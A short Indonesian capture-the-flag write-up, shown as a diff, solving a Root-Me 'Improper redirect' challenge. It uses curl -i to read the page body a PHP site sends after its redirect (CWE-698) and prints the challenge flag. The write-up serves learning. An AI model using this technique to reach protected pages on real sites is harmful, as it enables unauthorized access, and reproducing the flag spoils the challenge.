@@ -1,0 +1,34 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect
+
+	Challenge's Name : Improper redirect
+	
+	Hint : Dont trust your browser
+	
+	Pada soal meminta Get access to index yang artinya kita harus dapat mengakses index web tersebut
+	
+	Solusi : http://challenge01.root-me.org/web-serveur/ch32/index.php <<=== ga mempan redirect lagi ke soal
+	
+	Solusi yang benar : curl -i http://challenge01.root-me.org/web-serveur/ch32/index.php
+	
+	Result : HTTP/1.1 302 Moved Temporarily
+			 Server: nginx
+			 Date: Sat, 12 Nov 2016 21:39:05 GMT
+			 Content-Type: text/html; charset=UTF-8
+			 Location: ./login.php?redirect
+			 Transfer-Encoding: chunked
+			 Connection: Keep-Alive
+
+	<html>
+	<body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+	<h1>Welcome !</h1>
+
+	<p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'),
+  PHP just continue the execution and send the page content !...</p>
+	<p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
+	<p>The flag is : ExecutionAfterRedirectIsBad</p>
+	</body>
+	</html>
+	
+	Flag : ExecutionAfterRedirectIsBad
